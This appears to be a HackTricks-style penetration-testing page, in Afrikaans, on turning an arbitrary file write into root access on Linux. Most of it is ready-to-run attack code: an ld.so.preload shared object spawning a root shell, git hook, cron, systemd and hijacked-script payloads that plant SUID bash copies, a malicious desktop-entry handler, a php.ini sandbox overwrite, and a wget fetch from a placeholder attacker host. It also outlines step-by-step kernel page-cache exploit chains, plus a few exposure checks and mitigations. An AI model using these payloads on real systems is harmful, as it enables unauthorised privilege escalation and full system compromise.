# Arbitrary File Write na Root

### /etc/ld.so.preload

`/etc/ld.so.preload` is 'n stelselwye lys van shared objects wat die dynamic linker voor ander shared objects laai. Secure-execution mode pas bykomende beperkings op preloading toe, dus is 'n library path soos `/tmp/pe.so` nie 'n universele SUID-binary-tegniek nie.\
As jy dit kan skep of wysig, sal 'n proses wat die lêer laai, die gelyste library voor sy ander shared objects laai, wat code execution in daardie proses se konteks moontlik maak.<sup>[[12]](#references)</sup>

Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** is uitvoerbare scripts wat vir gebeurtenisse in 'n repository uitgevoer word, insluitend commit- en merge-bewerkings. As 'n **bevoorregte script of gebruiker** hierdie handelinge uitvoer en 'n aanvaller **in die `.git`-lêergids kan skryf**, kan die hook vir **privilege escalation** gebruik word.<sup>[[13]](#references)</sup>

Byvoorbeeld, dit is moontlik om 'n **script te genereer** in 'n git repo in **`.git/hooks`**, sodat dit altyd uitgevoer word wanneer 'n nuwe commit geskep word:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron- en tydlêers

As jy **cron-verwante lêers kan skryf wat deur root uitgevoer word**, kan jy gewoonlik code execution kry die volgende keer wanneer die taak loop. Interessante teikens sluit in:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root se eie crontab in `/var/spool/cron/` of `/var/spool/cron/crontabs/`
- `systemd` timers en die dienste wat hulle aktiveer

Vinnige kontroles:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipiese misbruikpaaie:

- **Voeg ’n nuwe root cron job by** `/etc/crontab` of ’n lêer in `/etc/cron.d/`
- **Vervang ’n script** wat reeds deur `run-parts` uitgevoer word
- **Backdoor ’n bestaande timer-teiken** deur die script of binary wat dit launch, te wysig

Minimale cron payload-voorbeeld:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
As jy slegs binne ’n cron-gids wat deur `run-parts` gebruik word kan skryf, plaas eerder ’n uitvoerbare lêer daar:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` ignoreer gewoonlik lêername wat punte bevat, dus verkies name soos `backup` eerder as `backup.sh`.<sup>[[15]](#references)</sup>
- Sommige stelsels gebruik `systemd` timers in plaas van klassieke cron, maar die misbruikidee is dieselfde: **wysig wat root later sal uitvoer**.<sup>[[20]](#references)</sup>

### Service & Socket-lêers

As jy **`systemd` unit files** of lêers waarna hulle verwys kan skryf, kan jy moontlik code execution as root verkry deur die unit te herlaai en te herbegin, of deur te wag totdat die service/socket activation-pad geaktiveer word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interessante teikens sluit in:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries waarna `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwys
- Skryfbare `EnvironmentFile=`-paaie wat deur ’n root-service gelaai word

Vinnige kontroles:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Algemene misbruikpaaie:

- **Overwrite `ExecStart=`** in 'n root-owned service unit wat jy kan wysig
- **Add a drop-in override** met 'n malicious `ExecStart=` en clear eers die ou een
- **Backdoor the script/binary** waarna die unit reeds verwys
- **Hijack a socket-activated service** deur die ooreenstemmende `.service`-lêer te wysig wat begin wanneer die socket 'n connection ontvang

Voorbeeld van 'n malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipiese aktiveringsvloei:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
As jy nie dienste self kan herbegin nie, maar ’n socket-activated unit kan wysig, hoef jy moontlik net **vir ’n kliëntverbinding te wag** om die uitvoering van die backdoored diens as root te aktiveer.<sup>[[17]](#references)</sup>

### Oorskryf ’n beperkende `php.ini` wat deur ’n bevoorregte PHP-sandbox gebruik word

Sommige pasgemaakte daemons valideer PHP wat deur gebruikers verskaf word deur `php` met ’n **beperkte `php.ini`** uit te voer (byvoorbeeld, `disable_functions=exec,system,...`). As die sandboxed kode steeds **enige write primitive** (soos `file_put_contents`) het en jy toegang tot die **presiese `php.ini`-pad** wat deur die daemon gebruik word kan verkry, kan jy daardie **config** oorskryf om beperkings op te hef en daarna ’n tweede payload indien wat met verhoogde privileges uitgevoer word.<sup>[[2]](#references)</sup>

Tipiese vloei:

1. Die eerste payload oorskryf die sandbox-config.
2. Die tweede payload voer kode uit noudat gevaarlike functions weer enabled is.

Minimale voorbeeld (vervang die pad wat deur die daemon gebruik word):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
As die daemon as root loop (of valideer met paaie wat deur root besit word), lewer die tweede uitvoering ’n root-konteks. Dit is in wese **privilege escalation via config overwrite** wanneer die sandboxed runtime steeds lêers kan skryf.

### binfmt_misc

`binfmt_misc` stel registrasies onder `/proc/sys/fs/binfmt_misc` bloot; elke registrasie assosieer ’n lêertipepatroon met ’n interpreter. Die privilege-impak hang af van wie die registrasie kan verander en watter proses later die ooreenstemmende lêer uitvoer; verifieer dus hierdie vereistes voordat jy dit as ’n privilege-escalation-pad beskou.<sup>[[21]](#references)</sup>

### Oorskryf van schema handlers (soos http: of https:)

Desktop-omgewings gebruik MIME-assosiasies en desktop entries om ’n toepassing vir URI-skemas te kies; ’n aanvaller wat die relevante per-user-konfigurasie- en desktop-entry-gidse kan skryf, kan daardie skemas herlei na ’n launcher wat hulle beheer. Deur die `$HOME/.config/mimeapps.list`-lêer te wysig om HTTP- en HTTPS-URL-handlers na ’n malicious lêer te wys (byvoorbeeld, `x-scheme-handler/http=evil.desktop` en `x-scheme-handler/https=evil.desktop`), kan ’n gebruiker se klik daardie desktop entry aanroep.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root voer gebruiker-skryfbare scripts/binaries uit

As ’n bevoorregte workflow iets soos `/bin/sh /home/username/.../script` uitvoer (of enige binary binne ’n gids wat deur ’n onbevoorregte gebruiker besit word), kan jy dit kaap:<sup>[[1]](#references)</sup>

- **Bespeur die uitvoering:** monitor prosesse met pspy om root op te spoor wanneer dit gebruiker-beheerde paths aanroep.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Bevestig skryfbaarheid:** verseker dat beide die teikenlêer en sy gids deur jou gebruiker besit word en skryfbaar is.
- **Kaping van die teiken:** rugsteun die oorspronklike binary/script en plaas ’n payload wat ’n SUID-shell (of enige ander root-aksie) skep, en herstel dan die permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). When root re-executes the hijacked path, grab the escalated shell with `./rootshell -p`.

### Page-cache-only-lêerwysiging van bevoorregte binaries

Sommige kernel-bugs wysig nie die lêer **op skyf** nie. In plaas daarvan laat hulle jou toe om slegs die **page cache-kopie** van ’n leesbare lêer te wysig. As jy ’n **setuid**- of andersins **root-executed** binary kan teiken, kan die volgende uitvoering aanvaller-beheerde bytes uit die geheue uitvoer en privileges eskaleer, selfs al het die lêer-hash op skyf onveranderd gebly.<sup>[[3]](#references)[[4]](#references)</sup>

Dit is nuttig om hieraan te dink as ’n **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Skyf bly skoon**: die inode en bytes op skyf verander nie
- **Geheue is dirty**: prosesse wat die gecachede page lees/uitvoer, kry die aanvaller-gewysigde inhoud
- **Effek is tydelik**: die verandering verdwyn ná ’n reboot of cache eviction

Hierdie primitive sit tussen klassieke **arbitrary file write** en ouer **page-cache abuse**-bugs soos Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW het op ’n race staatgemaak
- Dirty Pipe het beperkings op die write-position gehad
- ’n Page-cache-only primitive kan meer betroubaar wees as die kwesbare pad direkte writes na gecachede file-backed pages bied

#### Generic privesc flow

1. Kry ’n kernel primitive wat na **file-backed page cache pages** kan skryf
2. Gebruik dit teen ’n **readable privileged binary** of ’n ander root-executed lêer
3. Trigger uitvoering **voordat** die page uit die cache geëvict word
4. Kry code execution as root terwyl die lêer op skyf steeds onveranderd lyk

Tipiese teikens met hoë waarde:

- **setuid-root** binaries
- Helpers wat deur **root services** geloods word
- Binaries wat algemeen uitgevoer word vanuit **containers wat die host kernel/page cache deel**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) is ’n goeie voorbeeld van hierdie klas. Die kwesbare pad was in die Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kan references na page-cache pages van ’n leesbare lêer na die crypto TX scatterlist skuif
- die in-place `algif_aead` decrypt path het source- en destination-buffers hergebruik
- `authencesn` het daarna na die destination tag-region geskryf
- wanneer daardie region steeds na spliced file-backed pages verwys het, het die write in die **page cache van die target-lêer** beland

Die interessante technique is dus nie die CVE self nie, maar die pattern:

- **voer file-backed cache pages na ’n kernel-subsystem**
- laat die subsystem hulle as writable output **hanteer**
- trigger ’n klein, beheerde overwrite in die geheue

Die public PoC het herhaalde **4-byte writes** gebruik om `/usr/bin/su` in die geheue te patch en dit daarna uitgevoer.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) toon nog ’n variant van dieselfde **page-cache-only write-to-root** pattern, maar hierdie keer is die sink **IPsec ESP decrypt** in plaas van `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die belangrike technique is die **metadata-laundering-stap**:

- `splice()` plaas ’n **read-only file-backed page-cache page** in ’n ESP-in-UDP-packet
- die oorspronklike DirtyFrag-mitigation het daardie skb met `SKBFL_SHARED_FRAG` gemerk sodat `esp_input()` sou **copy voordat dit decrypt**
- netfilter `TEE` dupliseer die packet deur `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- die clone behou dieselfde **fisiese page-cache reference**, maar verloor `SKBFL_SHARED_FRAG`
- `esp_input()` behandel die clone dan as veilig en voer **in-place `cbc(aes)` decrypt** oor die file-backed page uit

Die reviewer-les is dus breër as die CVE: as ’n mitigation van **skb/page metadata** afhang om te besluit of ’n operation eers moet copy, kan enige **clone/copy path wat die backing page behou maar die metadata laat val** die write primitive stilweg heropen.

Tipiese exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` om **`CAP_NET_ADMIN` binne ’n private network namespace** te verkry
2. bring loopback op en installeer ’n **netfilter `TEE`-reël** in `mangle/OUTPUT`
3. installeer **XFRM ESP transport SAs** via `NETLINK_XFRM`
4. encode elke target 4-byte word in die SA `seq_hi`-field (DirtyFrag se word-selection-trick)
5. stuur die spliced ESP-in-UDP-packet sodat die **TEE clone** `esp_input()` bereik en **in place** decrypt
6. herhaal totdat die page-cache-kopie van `/usr/bin/su` of ’n ander bevoorregte executable aanvaller-beheerde code bevat

Operasioneel is die impak dieselfde as in die `AF_ALG`-voorbeeld: die lêer op skyf bly skoon, maar `execve()` gebruik die **gemuteerde page-cache-bytes** en lewer root.<sup>[[8]](#references)[[9]](#references)</sup>

Nuttige exposure checks vir hierdie variant:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Korttermyn-aanvalsoppervlakvermindering is hier ook padspesifiek: opgradering na 'n kernel wat `48f6a5356a33` bevat, herstel die clone-pad, terwyl die blokkering van `xt_TEE`-autoloading die **flag-laundering step** verwyder en die blokkering van `esp4` / `esp6` die **decrypt sink** verwyder.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Blootstelling en opsporing

As jy hierdie klas fout vermoed, moenie slegs op skyf-integriteitskontroles staatmaak nie. Verifieer ook:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Die konfigurasiewaardes hieronder onderskei ’n loadable interface van een wat in die kernel ingebou is; die crypto build rules karteer `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kan as ’n module gelaai/ontlaai word
- `CONFIG_CRYPTO_USER_API_AEAD=y`: die interface is in die kernel ingebou
- setuid binaries is goeie teikens omdat ’n patch wat slegs die page cache raak, genoeg kan wees om ’n plaaslike foothold na root te omskep

#### Aanvalsoppervlakvermindering vir die `algif_aead`-pad

As die kwesbare interface deur ’n loadable module verskaf word:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
As dit in die kernel saamgestel is, het sommige disclosures gerapporteer dat die init path geblokkeer word met:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Hierdie soort mitigation is ook die moeite werd om vir ander kernel-LPE's te onthou: indien exploitation van 'n spesifieke opsionele interface afhang, kan die deaktivering of blacklisting van daardie interface die exploit path breek selfs voordat 'n volledige kernel-upgrade beskikbaar is.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking van 'n root-uitgevoerde script in 'n gebruiker-skryfbare PaperCut-gids](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) Gereelde vrae](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security-bekendmaking vir CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Terugkeer na werking out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431-advies](https://copy.fail/)
- [7] [Theori / Xint tegniese uiteensetting](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Ontleding en exploitation van Linux LPE-variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: behoud `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Vroeëre Linux-versagting: stel `SKBFL_SHARED_FRAG` vir gesplyste UDP-pakkette (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian-handleidingbladsy](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel-dokumentasie](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME-toepassingsassosiasies](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Gedeelde MIME-info-spesifikasie](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry-spesifikasie](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-taal](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux Kernel AF_ALG-bladsykas-kwesbaarheid](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
